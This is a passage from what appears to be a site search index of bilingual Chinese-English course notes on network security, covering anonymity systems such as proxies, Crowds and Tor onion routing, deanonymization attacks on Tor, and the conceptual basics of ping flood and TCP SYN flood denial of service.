\u5e38\u6307\u4e00\u79cd\u7f51\u7edc\u8bbe\u5907\u6216\u670d\u52a1\uff0c\u53ef\u4ee5\u7528\u4e8e \u8f6c\u53d1 \u6570\u636e\u5305\u6216\u4fe1\u606f, \u4ee5\u5e2e\u52a9\u8fde\u63a5\u4e0d\u540c\u7684\u5b50\u7f51\u6216\u7f51\u7edc\u3002</li> <li>\u4e2d\u7ee7\u53ef\u4ee5\u5e2e\u52a9\u89e3\u51b3\u7f51\u7edc\u901a\u4fe1\u4e2d\u7684\u8ddd\u79bb\u9650\u5236\u548c\u534f\u8bae\u8f6c\u6362\u95ee\u9898\uff0c\u8fdb\u800c\u6269\u5927\u7f51\u7edc\u7684\u8986\u76d6\u8303\u56f4\u548c\u529f\u80fd\u3002</li> <li>\u4e2d\u7ee7\u53ef\u4ee5\u5206\u4e3a\u7269\u7406\u4e2d\u7ee7\u548c\u903b\u8f91\u4e2d\u7ee7\u4e24\u79cd\u7c7b\u578b\u3002<ul> <li>\u7269\u7406\u4e2d\u7ee7\u662f\u6307\u4e00\u79cd\u7f51\u7edc\u8bbe\u5907\u6216\u94fe\u8def\uff0c\u5b83\u7528\u4e8e\u5c06\u6570\u636e\u5305\u4ece\u4e00\u4e2a\u7269\u7406\u7f51\u7edc\u8f6c\u53d1\u5230\u53e6\u4e00\u4e2a\u7269\u7406\u7f51\u7edc\u3002\u6bd4\u5982\uff0c\u7f51\u7edc\u4ea4\u6362\u673a\u3001\u8def\u7531\u5668\u3001\u7f51\u5173\u7b49\u8bbe\u5907\u3002</li> <li>\u903b\u8f91\u4e2d\u7ee7\u662f\u6307\u4e00\u79cd\u8f6f\u4ef6\u6216\u670d\u52a1\uff0c\u5b83\u7528\u4e8e\u5c06\u6570\u636e\u5305\u4ece\u4e00\u4e2a\u903b\u8f91\u7f51\u7edc\u8f6c\u53d1\u5230\u53e6\u4e00\u4e2a\u903b\u8f91\u7f51\u7edc\u3002\u6bd4\u5982\uff0c\u4ee3\u7406\u670d\u52a1\u5668\u3001VPN \u7f51\u5173\u3001DNS \u4e2d\u7ee7\u7b49\u670d\u52a1\u3002</li> </ul> </li> </ul> <p>Here comes Overlay Communication</p>"}, {"location": "Course/netsec/anonymity/#overlay-communication", "title": "Overlay Communication", "text": "<p>Overlay Communication</p> <ul> <li>Overlay Communication\uff08\u8986\u76d6\u901a\u4fe1\uff09\u662f\u4e00\u79cd\u5728\u7f51\u7edc\u4e2d\u6dfb\u52a0\u865a\u62df\u7f51\u7edc\u5c42\u7684\u6280\u672f\uff0c\u7528\u4e8e\u6539\u8fdb\u7f51\u7edc\u6027\u80fd\u548c\u6269\u5c55\u7f51\u7edc\u529f\u80fd\u3002</li> <li>\u901a\u8fc7\u8986\u76d6\u901a\u4fe1\uff0c\u53ef\u4ee5\u5728\u73b0\u6709\u7684\u7f51\u7edc\u67b6\u6784\u4e0a\u589e\u52a0\u4e00\u4e2a\u865a\u62df\u7684\u7f51\u7edc\u5c42\uff0c\u8fd9\u4e2a\u865a\u62df\u5c42\u4e0e\u5e95\u5c42\u7f51\u7edc\u76f8\u4e92\u72ec\u7acb\uff0c\u53ef\u4ee5\u5b9e\u73b0\u66f4\u9ad8\u6548\u3001\u66f4\u5b89\u5168\u548c\u66f4\u7075\u6d3b\u7684\u901a\u4fe1\u65b9\u5f0f\u3002\u200b</li> </ul> <p></p> <p>\u5176\u4e2d ip3 \u662f\u4e00\u4e2a relay node</p>"}, {"location": "Course/netsec/anonymity/#overlay-network", "title": "Overlay Network", "text": "<p>\u8986\u76d6\u901a\u4fe1\u7684\u4e3b\u8981\u601d\u60f3\u662f\uff0c\u5728\u5e94\u7528\u5c42\u548c\u4f20\u8f93\u5c42\u4e4b\u95f4\u6dfb\u52a0\u4e00\u4e2a \u4e2d\u95f4\u5c42\uff0c\u8fd9\u4e2a\u4e2d\u95f4\u5c42\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u4e0d\u540c\u7684\u534f\u8bae\u3001\u8def\u7531\u548c\u62d3\u6251\u7ed3\u6784\u6765\u4f18\u5316\u7f51\u7edc\u901a\u4fe1\u3002</p> <p>\u5728\u8986\u76d6\u901a\u4fe1\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u4f1a\u5c06\u6570\u636e\u5305\u53d1\u9001\u5230\u8986\u76d6\u7f51\u7edc\u4e2d\uff0c\u7136\u540e\u7531\u8986\u76d6\u7f51\u7edc\u8d1f\u8d23\u5c06\u6570\u636e\u5305\u4f20\u8f93\u5230\u76ee\u6807\u5730\u5740\uff0c\u4ece\u800c\u5b9e\u73b0\u66f4\u5feb\u901f\u3001\u66f4\u53ef\u9760\u7684\u901a\u4fe1\u3002</p> <p>Threat Model</p> <p>\u8fd9\u91cc\u5b9a\u4e49\u653b\u51fb\u6a21\u578b\uff1aInsider Byzantine Attacker</p> <ul> <li>Insider \u8868\u793a\u653b\u51fb\u8005\u672c\u8eab\u662f\u7f51\u7edc\u7684\u4e00\u90e8\u5206\uff08ASes, \u653b\u51fb\u8005\u53ef\u80fd\u63a7\u5236\u4e0d\u6b62\u4e00\u4e2a ASes\uff09\u4f46\u653b\u51fb\u8005\u6ca1\u6709\u80fd\u529b\u77e5\u9053\u6574\u4e2a\u7f51\u7edc (limited view of network)</li> <li>Byzantine \u8868\u793a\u4e00\u79cd\u653b\u51fb\u6a21\u5f0f\uff0c\u653b\u51fb\u8005\u7684\u7684\u653b\u51fb\u884c\u4e3a\u662f\u4e0d\u7a33\u5b9a\u7684\uff08\u957f\u671f\u3001\u4e00\u81f4\u7684\u653b\u51fb\u4f1a\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u91c7\u53d6\u95f4\u65ad\u5f0f\u7684\u3001\u4e0d\u540c\u65b9\u5f0f\u7684\u653b\u51fb\uff0c\u5c31\u6bd4\u8f83\u96be\u88ab\u68c0\u6d4b\u5230\u4e86\uff09</li> </ul> <p>\u653b\u51fb\u8005\u7684\u76ee\u6807\u662f\uff1a\u5728\u76ee\u7684 IP \u4fe1\u606f\u9690\u85cf\u5728\u6570\u636e\u5305\u4e2d\u7684\u60c5\u51b5\u4e0b\uff0c\u5f97\u77e5\u6570\u636e\u5305\u7684\u6700\u7ec8\u76ee\u7684\u5730\u3002</p> <p>\u7531\u6b64\u63d0\u51fa\u4e24\u79cd\u653b\u51fb\u884c\u4e3a\uff1a</p> <ol> <li>Traceforward Attack<ul> <li>passive attacker</li> <li>traces messages from sender, thwarts receiver anonymity</li> <li>\u88ab\u52a8\u653b\u51fb\u8005\u8ddf\u8e2a\u6570\u636e\u5305\u4fe1\u606f</li> </ul> </li> <li>Marking Attack<ul> <li>active attacker</li> <li>marks messages, discovers marked msg elsewhere</li> <li>\u653b\u51fb\u8005\u6bd4\u8f83\u5389\u5bb3\uff0c\u53ef\u4ee5\u6539\u7ecf\u8fc7\u5b83\u7684\u6570\u636e\u5305\uff0c\u90a3\u53ef\u4ee5\u52a0\u4e2a\u6807\u8bb0\uff0c\u7136\u540e\u5728\u5176\u4ed6\u5730\u65b9\u53d1\u73b0\u5c31\u77e5\u9053\u662f\u53d1\u8fc7\u6765\u4e86</li> </ul> </li> </ol>"}, {"location": "Course/netsec/anonymity/#anonyminzing-proxy", "title": "Anonyminzing Proxy", "text": "<ul> <li>intermediary between sender &amp; receiver</li> <li>Sender relays all traffic through proxy</li> <li>Encrypt destination and payload</li> <li>Asymmetric technique: receiver not involved (or informed of) anonymity</li> </ul> <p>k: shared key of sender and proxy</p> <ol> <li>\u5982\u679c\u653b\u51fb\u8005\u5728 sender \u548c proxy \u4e4b\u95f4\u76d1\u542c\uff0c\u90a3\u4e48 sender \u4e27\u5931\u4e86\u533f\u540d\u6027</li> <li>\u5982\u679c\u653b\u51fb\u8005\u5728 proxy \u548c receiver \u4e4b\u95f4\u76d1\u542c\uff0c\u90a3\u4e48 receiver \u4e27\u5931\u4e86\u533f\u540d\u6027</li> <li>\u5982\u679c\u6709\u4e24\u4e2a\u653b\u51fb\u8005\uff0c\u4e00\u4e2a\u5728 sender \u548c proxy \u4e4b\u95f4\uff0c\u4e00\u4e2a\u5728 proxy \u548c receiver \u4e4b\u95f4\uff0c\u4e24\u8005\u4e32\u901a\u6bd4\u5bf9 ingress \u548c egress \u7684\u6d41\u91cf\uff0c\u5219 sender \u548c receiver \u90fd\u4e27\u5931\u4e86\u533f\u540d\u6027</li> <li>\u5982\u679c proxy \u672c\u8eab\u662f\u6076\u610f\u7684\uff0c\u90a3\u4e48 sender \u548c receiver \u90fd\u4e27\u5931\u4e86\u533f\u540d\u6027</li> </ol>"}, {"location": "Course/netsec/anonymity/#what-if-receiver-is-attacker", "title": "what if receiver is attacker", "text": "<p>\u9700\u8981\u4fdd\u62a4\u53d1\u9001\u8005\u7684\u533f\u540d\u6027</p> <p></p>"}, {"location": "Course/netsec/anonymity/#_1", "title": "\u4f18\u7f3a\u70b9", "text": "<ul> <li>Advantages:<ul> <li>Easy to configure</li> <li>Require no active participation of receiver, which need not be aware of anonymity service</li> <li>Have been widely deployed on Internet</li> </ul> </li> <li>Disadvantages:<ul> <li>Require trusted third party proxy may release logs, or sell them, or blackmail sender</li> <li>Anonymity largely depends on the (likely unknown) location of attacker</li> </ul> </li> </ul>"}, {"location": "Course/netsec/anonymity/#how-to-evade-attackers", "title": "How to evade attackers?", "text": "<p>dynamic proxy location</p> <p>Here comes Crowds Algorithm</p> <ul> <li>Basic idea: get lost in a crowd</li> <li>Jump from one crowd to another</li> <li>Members of a crowd called Jondos</li> <li>Algorithm:<ul> <li>Relay message to random jondo</li> <li>With probability p, jondo forwards message to another jondo</li> <li>With probability 1-p, jondo delivers message to its intended destination</li> </ul> </li> </ul> <p></p>"}, {"location": "Course/netsec/anonymity/#how-to-evade-untrusted-proxies", "title": "How to evade untrusted proxies?", "text": "<p>proxy ++</p> <p>\u591a\u5f04\u4e00\u4e9b proxy, \u7528\u4e8e\u6df7\u6dc6\u653b\u51fb\u8005\u7684\u89c6\u7ebf</p> <p>Its hard for an attacker to simultaneously control too many proxies</p> <p>Other methods: </p>"}, {"location": "Course/netsec/anonymity/#source-routing", "title": "Source Routing", "text": "<p>Abstract</p> <ul> <li>specify on-path routers by source</li> <li>allows a sender of a\u00a0packet\u00a0to partially or completely specify the\u00a0route\u00a0the packet takes through the network.</li> <li>In contrast, in conventional\u00a0routing, routers in the network determine the path incrementally based on the packet\u2019s destination</li> </ul> <p>Source Routing / Path Addressing \u5141\u8bb8\u53d1\u9001\u8005\u6307\u5b9a\u4e00\u4e2a\u5305\u7684\u90e8\u5206\u6216\u8005\u5168\u90e8\u8def\u7531\u200b</p> <p>\u6e90\u8def\u7531\u6280\u672f\u4e2d\uff0c\u6570\u636e\u5305\u7684\u8def\u7531\u8def\u5f84\u662f\u5728\u6570\u636e\u5305\u7684\u5934\u90e8\u4e2d\u6307\u5b9a\u7684\uff0c\u8fd9\u610f\u5473\u7740\u53d1\u9001\u65b9\u53ef\u4ee5\u9009\u62e9\u6570\u636e\u5305\u7684\u8def\u7531\u8def\u5f84\uff0c\u800c\u4e0d\u662f\u8ba9\u7f51\u7edc\u4e2d\u7684\u8def\u7531\u5668\u6839\u636e\u5b83\u4eec\u7684\u8def\u7531\u8868\u6765\u81ea\u52a8\u9009\u62e9\u3002</p>"}, {"location": "Course/netsec/anonymity/#pof-based-source-routing", "title": "POF-based Source Routing", "text": "<p>POF: Protocol Oblivious Forwarding</p> <p></p> <p>\u4f20\u7edf\u7684\u7f51\u7edc\u534f\u8bae\u4e2d\uff0crouter \u9700\u8981\u6839\u636e\u7279\u5b9a\u7684\u534f\u8bae\u6765\u89e3\u6790\u6570\u636e\u5305\u7684\u5934\u90e8\uff0c\u7136\u540e\u6839\u636e\u534f\u8bae\u7684\u89c4\u5219\u6765\u8f6c\u53d1\u6570\u636e\u5305\u3002\u800c POF \u91c7\u7528\u4e86\u65b0\u7684\u8f6c\u53d1\u673a\u5236\uff08\u4ece\u6570\u636e\u5305\u7684\u6e90\u5934\u5f00\u59cb\u6307\u5b9a\u5168\u90e8\u6216\u90e8\u5206\u8def\u7531\uff09\uff0c\u5373\u4e0d\u9700\u8981\u4e86\u89e3\u4efb\u4f55\u7279\u5b9a\u534f\u8bae\uff0c\u53ea\u9700\u8981\u6839\u636e\u6307\u5b9a\u8def\u5f84\u8fdb\u884c\u8f6c\u53d1\u3002</p> \u65b0\u7684\u95ee\u9898\u89e3\u51b3\u7b56\u7565 <p>\u533f\u540d\u6027\u95ee\u9898\uff1a\u6cc4\u6f0f\u4e86 port sequence</p> <p>\u9690\u85cf\u975e neighbor \u7684 port sequence</p> <p>\u4e3a\u4e86\u9690\u85cf\u975e neighbor \u7684 port sequence\uff0c \u53ef\u4ee5\u4f7f\u7528 Onion Routing</p>"}, {"location": "Course/netsec/anonymity/#onion-routing", "title": "Onion Routing", "text": "<p>Use onion router called Tor</p> requestreply <p></p> <p></p> <p>\u5728\u6d0b\u8471\u7f51\u7edc\u4e2d\uff0c\u4fe1\u606f\u88ab\u5c01\u88c5\u5728\u52a0\u5bc6\u5c42\u3002</p> <p></p> <ul> <li>\u7c7b\u4f3c\u4e8e\u6d0b\u8471\u4e00\u6837\uff0c\u52a0\u5bc6\u6570\u636e\u901a\u8fc7\u4e00\u7cfb\u5217 \u201cTor node\u201d \u8def\u7531\u5668\u8282\u70b9\u4f20\u8f93\uff0c\u6bcf\u4e2a\u8282\u70b9\u53ea\u80fd\u89e3\u5bc6\u4e00\u5c42\uff0c\u7136\u540e\u5c06\u6570\u636e\u4f20\u9012\u7ed9\u4e0b\u4e00\u4e2a\u8282\u70b9\u3002</li> <li>\u5f53\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u89e3\u5bc6\u6570\u636e\u65f6\uff0c\u5b83\u5c06\u6570\u636e\u4f20\u9012\u7ed9\u76ee\u6807\u5730\u5740\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u7aef\u5230\u7aef\u7684\u533f\u540d\u901a\u4fe1\u3002</li> <li>\u7531\u6b64\uff0csender \u4fdd\u6301\u4e86\u533f\u540d\u6027\uff0c receiver \u4e5f\u4fdd\u6301\u4e86\u533f\u540d\u6027\u3002\u6bcf\u4e2a\u4e2d\u7ee7\u8282\u70b9\u53ea\u77e5\u9053\u7d27\u90bb\u7684\u8282\u70b9</li> </ul> source-routing based anonymous overlay communication <ol> <li>\u5411 directory node \u83b7\u53d6\u8282\u70b9\u5217\u8868\uff0c\u968f\u673a\u9009\u62e9\u8282\u70b9\u5f62\u6210\u4e00\u6761 chain</li> <li>\u4ece directory node \u83b7\u53d6\u516c\u94a5\uff0c\u4e0e A (Tor entry) \u534f\u5546\u5bc6\u94a5;<ol> <li>A \u4e0e\u4e0b\u4e00\u8282\u70b9 B \u534f\u5546\u5bc6\u94a5</li> <li>\u2026</li> <li>\u6700\u540e\u8282\u70b9 (\u5047\u5982\u662f C) \u4e0e\u76ee\u6807\u5730\u5740 (D) \u534f\u5546\u5bc6\u94a5\uff0c\u5efa\u7acb\u6574\u6761\u94fe\u7684\u8fde\u63a5</li> </ol> </li> <li>\u53d1\u9001 \\(\\{\\{\\{\\{\\text{msg}\\}_D ~, D\\}_C ~, C\\}_B ~, B\\}_A\\), \u8fd9\u6837\u9010\u5c42\u89e3\u5bc6\u624d\u80fd\u53d1\u9001\u5230\u76ee\u6807\u5730\u5740</li> <li>reply \u7684\u65f6\u5019\u4f7f\u7528\u540c\u4e00\u6761\u53cd\u5411\u5373\u53ef</li> </ol> <p>\u89e3\u5bc6\u51fa\u7684\u6570\u636e\u9664\u4e86\u4fe1\u606f\u5916\uff0c\u8fd8\u5305\u62ec\u8981 forward \u7684\u4e0b\u4e00\u8df3\u5730\u5740</p> application: Darknet <ul> <li>Portions of the Internet purposefully not open to public view or hidden networks whose architecture is superimposed on that of Internet.</li> <li>Install Tor</li> <li>Access darknet.onion through it</li> </ul> <p></p>"}, {"location": "Course/netsec/anonymity/#how-to-deanonymize", "title": "how to deanonymize?", "text": "<p>\u6709\u56db\u79cd\u601d\u8003\u7b56\u7565\uff1a</p> <ol> <li>tor nodes \u4e92\u76f8\u4e32\u901a</li> <li>\u5f3a\u884c\u7834\u89e3\u5bc6\u94a5</li> <li>Passive monitoring</li> <li>Active attraction: <ul> <li>deploy a Tor router;</li> <li>attract Tor traffic;</li> <li>perform traffic analysis and correlation;</li> </ul> </li> </ol>"}, {"location": "Course/netsec/anonymity/#path-selection-attack", "title": "Path Selection Attack", "text": "<ul> <li>Tor path selection algorithm:<ul> <li>weight nodes by selfreported bandwidth; | \u901a\u8fc7\u81ea\u62a5\u5e26\u5bbd\u6765\u5bf9\u8282\u70b9\u52a0\u6743</li> <li>select each node using weighted | \u4f7f\u7528\u6743\u91cd\u9009\u62e9\u6bcf\u4e2a\u8282\u70b9</li> <li>probability distribution; | \u6982\u7387\u5206\u5e03</li> </ul> </li> <li>Attack:<ul> <li>malicious relay reports very high bw to increase selection probability; | \u6076\u610f\u4e2d\u7ee7\u8282\u70b9\u865a\u62a5\u975e\u5e38\u9ad8\u7684\u5e26\u5bbd\u4ee5\u589e\u52a0\u88ab\u9009\u4e2d\u6982\u7387</li> <li>if it controls the first hop, de-sender; | \u5982\u679c\u63a7\u5236\u4e86\u7b2c\u4e00\u4e2a hop, \u5219 sender \u4e27\u5931\u533f\u540d\u6027</li> <li>if it controls the last hop,  de-receiver; | \u5982\u679c\u63a7\u5236\u4e86\u6700\u540e\u4e00\u4e2a hop, \u5219 receiver \u4e27\u5931\u533f\u540d\u6027</li> </ul> </li> </ul>"}, {"location": "Course/netsec/anonymity/#counting-attack", "title": "Counting Attack", "text": "<ul> <li>Correlate incoming and outgoing flows by counting the number of packets | \u901a\u8fc7\u8ba1\u7b97\u6570\u636e\u5305\u7684\u6570\u91cf\u6765\u5bf9\u5165\u7ad9\u548c\u51fa\u7ad9\u6d41\u91cf\u8fdb\u884c\u5173\u8054</li> </ul> <p>\u5728\u68c0\u6d4b\u65f6\u95f4\u6bb5\uff0c\u6709\u53ef\u80fd\u6709\u4e4b\u524d\u505c\u7559\u5728\u5176\u4e2d\u7684 packert, \u6240\u4ee5 dest \u4f1a\u591a\u4e00\u4e9b\u4e5f\u53ef\u80fd\u6709\u4e9b\u6b63\u5728 process, \u6240\u4ee5 dest \u4f1a\u5c11\u4e00\u4e9b</p> <ul> <li>\u4e00\u79cd\u62b5\u5fa1\u7b56\u7565\u662f\uff1a\u5c06\u6d41\u91cf\u8f83\u5c0f\u7684\u8fdb\u884c\u6269\u5927\uff0c\u5c06\u6d41\u91cf\u8f83\u5927\u7684\u8fdb\u884c\u7f29\u5c0f\uff0c\u4f7f\u5f97\u6d41\u91cf\u5dee\u5f02\u53d8\u5c0f</li> <li>\u4f46\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u91c7\u6837\u5305\u4e4b\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u6765\u8fdb\u884c\u5206\u6790</li> </ul>"}, {"location": "Course/netsec/anonymity/#low-latency-attack", "title": "Low Latency Attack", "text": "<ul> <li>Tor router assigns each anonymous circuit its own queue | Tor \u8def\u7531\u5668\u4e3a\u6bcf\u4e2a\u533f\u540d\u7535\u8def\u5206\u914d\u4e00\u4e2a\u961f\u5217</li> <li>Dequeue one packet from each queue in round-robin fashion | \u4ee5\u8f6e\u8be2\u65b9\u5f0f\u4ece\u6bcf\u4e2a\u961f\u5217\u4e2d\u51fa\u961f\u4e00\u4e2a\u6570\u636e\u5305</li> </ul> <p>\u8282\u70b9\u8d8a\u591a\uff0c\u961f\u5217\u8d8a\u957f\uff0c\u8f6e\u8be2\u65f6\u95f4\u8d8a\u957f\uff0c\u5ef6\u8fdf\u8d8a\u5927\u3002</p> <p></p> <p>Attack Example</p> <p></p> <ul> <li>A \u8981\u653b\u51fb Init, intends to infer Init\u2019s activity</li> <li>\u5047\u8bbe\u53ea\u6709 Init \u548c A \u4e00\u8d77\u5728\u5360\u7528 T2</li> <li>\u90a3\u4e48 A \u5faa\u73af\u7ed9 T2 \u53d1\u5305\u5e76\u6d4b\u8bd5\u5ef6\u8fdf\uff0c\u5982\u679c\u5ef6\u8fdf\u53d8\u5927\uff0c\u5219\u8bf4\u660e Init Traffic\uff0c\u5373 Init \u5728\u6d3b\u52a8</li> </ul>"}, {"location": "Course/netsec/anonymity/#cross-site-attack", "title": "Cross Site Attack", "text": "<p>Crawling:</p> <ul> <li>Deploy Tor routers</li> <li>Access darknet</li> <li>Crawl transaction information</li> <li>Extract Bitcoin accounts of interest</li> </ul> <p>Correlation:</p> <ul> <li>Search the accounts on public websites</li> </ul>"}, {"location": "Course/netsec/ddos/", "title": "DDos", "text": "<p> \u7ea6 6170 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 21 \u5206\u949f</p>"}, {"location": "Course/netsec/ddos/#dos-denial-of-service", "title": "Dos | Denial of Service", "text": "<ul> <li>DoS (Denial of Service) \u653b\u51fb\u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u76ee\u7684\u662f\u4f7f\u76ee\u6807\u7cfb\u7edf\u6216\u7f51\u7edc\u8d44\u6e90\u65e0\u6cd5\u63d0\u4f9b\u670d\u52a1</li> <li>\u5373\u63a7\u5236\u4e00\u4e2a\u673a\u5668\uff0c\u5411\u76ee\u6807\u673a\u5668\u53d1\u9001\u5927\u91cf\u7684\u8bf7\u6c42\u4ee5 overload \u76ee\u6807\u673a\u5668\uff0c\u4f7f\u5176\u65e0\u6cd5\u5904\u7406\u5408\u7406\u7684\u8bf7\u6c42\uff08e.g., \u5356\u5f53\u52b3\u6d3e\u5927\u91cf\u81ea\u5bb6\u5458\u5de5\u53bb\u5751\u5fb7\u57fa\u70b9\u4e1c\u897f\uff0c\u4f46\u662f\u4e0d\u4e70\u5355\u4e14\u5904\u5904\u5201\u96be\uff0c\u4f7f\u5f97\u5751\u5fb7\u57fa\u65e0\u6cd5\u6b63\u5e38\u670d\u52a1\u771f\u6b63\u7684\u987e\u5ba2\uff09</li> <li>defence: block the attacking device</li> </ul>"}, {"location": "Course/netsec/ddos/#ddos-distributed-denial-of-service", "title": "DDoS | Distributed Denial of Service", "text": "<p>\u5728 DoS \u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u5355\u4e2a\u7cfb\u7edf\u5411\u76ee\u6807\u7cfb\u7edf\u53d1\u9001\u5927\u91cf\u8bf7\u6c42\u3002\u5728 DDoS \u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u591a\u4e2a\u7cfb\u7edf\u5411\u76ee\u6807\u7cfb\u7edf\u53d1\u9001\u5927\u91cf\u8bf7\u6c42\u3002\u4f7f\u5f97\u4ec5\u4ec5\u901a\u8fc7\u963b\u6b62\u653b\u51fb\u8005\u7684 IP \u5730\u5740\u65e0\u6cd5\u963b\u6b62\u653b\u51fb\u3002</p>"}, {"location": "Course/netsec/ddos/#symmetric-ddos-attack", "title": "Symmetric DDoS Attack", "text": "<p>the attacker requires a substantial amount of traffic to succeed.</p>"}, {"location": "Course/netsec/ddos/#ping-flood", "title": "Ping Flood", "text": "Ping Flood <ul> <li>Ping Flood \u662f\u4e00\u79cd\u7f51\u7edc\u653b\u51fb\uff0c\u5b83\u5229\u7528\u4e86 <code>ping</code> \u547d\u4ee4\u6765\u5411\u76ee\u6807\u4e3b\u673a\u53d1\u9001\u5927\u91cf\u7684 <code>ping</code> \u8bf7\u6c42, \u4f7f\u76ee\u6807\u4e3b\u673a\u4e0d\u65ad\u5730\u54cd\u5e94\u8bf7\u6c42\uff0c\u4ece\u800c\u5bfc\u81f4\u7f51\u7edc\u62e5\u585e\u548c\u670d\u52a1\u8d28\u91cf\u4e0b\u964d\u3001\u4f7f\u76ee\u6807\u4e3b\u673a\u8fc7\u8f7d\u6216\u5d29\u6e83\u3002</li> <li>Ping Flood \u653b\u51fb\u901a\u5e38\u662f DDoS \u7684\u4e00\u79cd\u5f62\u5f0f.</li> </ul> <p>1) Attack principle:</p> <p>\u7b80\u8a00\u4e4b\uff1asaturate the target device\u2019s capacity by sending many ICMP echo request packets</p> <ul> <li>Exploit the ICMP protocol</li> <li>both incoming ICMP Echo Request and outgoing ICMP Echo Reply consume bandwidth;</li> <li>overwhelm the target device\u2019s ability to respond to a high number of requests and/or overload the network connection with bogus traffic | \u538b\u5236\u76ee\u6807\u8bbe\u5907\u54cd\u5e94\u5927\u91cf\u8bf7\u6c42\u7684\u80fd\u529b\uff0cand/or \u4f7f\u7f51\u7edc\u8fde\u63a5\u8d85\u8d1f\u8377\u8fd0\u884c\u5047\u6d41\u91cf</li> <li>attacker sends a large number of ICMP echo request packets &amp; target server sends an ICMP echo reply packet to each requesting device\u2019s IP address as a response</li> </ul> <p>2) Ping Flood DDoS \u5f62\u5f0f\u53ef\u4ee5\u5206\u89e3\u4e3a\u4e24\u4e2a\u91cd\u590d\u7684\u6b65\u9aa4:</p> <ul> <li>The attacker sends many ICMP echo request packets to the targeted server using multiple devices.</li> <li>The targeted server then sends an ICMP echo reply packet to each requesting device\u2019s IP address as a response.</li> </ul> <p>3) \u89e3\u51b3\u65b9\u6cd5</p> <ul> <li>disable the ICMP functionality of the targeted device (make the device unresponsive to ping requests and traceroute requests)</li> <li>\u867d\u7136\u5f88\u6709\u6548\uff0c\u4f46\u540e\u679c\u662f\u6240\u6709\u6d89\u53ca ICMP \u7684\u7f51\u7edc\u6d3b\u52a8\u90fd\u88ab\u7981\u7528\uff0c\u5305\u62ec\u7f51\u7edc\u8bca\u65ad\u5de5\u5177 <code>ping</code> \u548c <code>traceroute</code>\u3002</li> </ul> more about Ping Flood <ul> <li>\u5728 Ping Flood \u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u4e92\u8054\u7f51\u63a7\u5236\u4fe1\u606f\u534f\u8bae (ICMP) \u662f\u7f51\u7edc\u8bbe\u5907\u7528\u4e8e\u901a\u4fe1\u7684\u4e92\u8054\u7f51\u5c42\u534f\u8bae\u3002</li> <li>\u7f51\u7edc\u8bca\u65ad\u5de5\u5177 <code>traceroute</code> \u548c <code>ping</code> \u90fd\u4f7f\u7528 ICMP \u64cd\u4f5c\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c ICMP \u56de\u6ce2\u8bf7\u6c42\u548c\u56de\u6ce2\u56de\u590d\u4fe1\u606f\u7528\u4e8e Ping \u7f51\u7edc\u8bbe\u5907\uff0c\u76ee\u7684\u662f\u8bca\u65ad\u8bbe\u5907\u7684\u5065\u5eb7\u72b6\u51b5\u548c\u8fde\u63a5\u6027\uff0c\u4ee5\u53ca\u53d1\u9001\u8005\u548c\u8bbe\u5907\u4e4b\u95f4\u7684\u8fde\u63a5\u3002</li> <li> <p>\u4e00\u4e2a ICMP \u8bf7\u6c42\u9700\u8981\u4e00\u4e9b\u670d\u52a1\u5668\u8d44\u6e90\u6765\u5904\u7406\u6bcf\u4e2a\u8bf7\u6c42\u548c\u53d1\u9001\u54cd\u5e94\u3002\u8be5\u8bf7\u6c42\u8fd8\u9700\u8981\u4f20\u5165\u4fe1\u606f\uff08\u56de\u97f3\u8bf7\u6c42\uff09\u548c\u4f20\u51fa\u54cd\u5e94\uff08\u56de\u97f3\u54cd\u5e94\uff09\u7684\u5e26\u5bbd\u3002</p> </li> <li> <p>\u5386\u53f2\u4e0a\uff0cattackers \u901a\u5e38\u4f1a\u4f2a\u9020\u4e00\u4e2a\u5047\u7684ip\u5730\u5740\uff0c\u4ee5\u63a9\u76d6\u53d1\u9001\u8bbe\u5907</p> </li> <li>\u5728\u73b0\u4ee3\u50f5\u5c38\u7f51\u7edc\u653b\u51fb\u4e2d\uff0c\u6076\u610f\u884c\u4e3a\u8005\u5f88\u5c11\u8ba4\u4e3a\u6709\u5fc5\u8981\u63a9\u76d6\u50f5\u5c38\u7684 IP, \u800c\u662f\u4f9d\u9760\u4e00\u4e2a\u7531\u672a\u88ab\u6b3a\u9a97\u7684\u50f5\u5c38\u7ec4\u6210\u7684\u5927\u578b\u7f51\u7edc\u6765\u4f7f\u76ee\u6807\u7684\u5bb9\u91cf\u9971\u548c</li> </ul>"}, {"location": "Course/netsec/ddos/#tcp-syn-flood", "title": "TCP SYN Flood", "text": "TCP SYN Flood <ul> <li>TCP SYN Flood \u662f\u4e00\u79cd DDoS \u653b\u51fb\uff0c\u5b83\u5229\u7528\u4e86 TCP \u534f\u8bae\u7684\u4e09\u6b21\u63e1\u624b\u8fc7\u7a0b\u4e2d\u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u5411\u76ee\u6807\u670d\u52a1\u5668\u53d1\u9001\u5927\u91cf\u7684 TCP \u8fde\u63a5\u8bf7\u6c42\uff0c\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u7684\u8d44\u6e90\u8017\u5c3d\uff0c\u65e0\u6cd5\u5904\u7406\u5408\u7406\u7684\u8bf7\u6c42\u3002</li> </ul> <p>\u653b\u51fb\u539f\u7406</p> <ul> <li>attacker \u4f7f\u7528\u50f5\u5c38\u7f51\u7edc\u53d1\u9001\u5927\u91cf\u7684 TCP \u8fde\u63a5\u8bf7\u6c42 (\u5411\u76ee\u6807\u670d\u52a1\u5668\u53d1\u9001 TCP SYN \u6570\u636e\u5305\uff0c\u4f46\u4e0d\u5b8c\u6210 TCP \u4e09\u6b21\u63e1\u624b\u8fc7\u7a0b)</li> <li>\u76ee\u6807\u670d\u52a1\u5668\u6536\u5230 SYN \u6570\u636e\u5305\u540e\uff0c\u4f1a\u54cd\u5e94\u4e00\u4e2a SYN+ACK 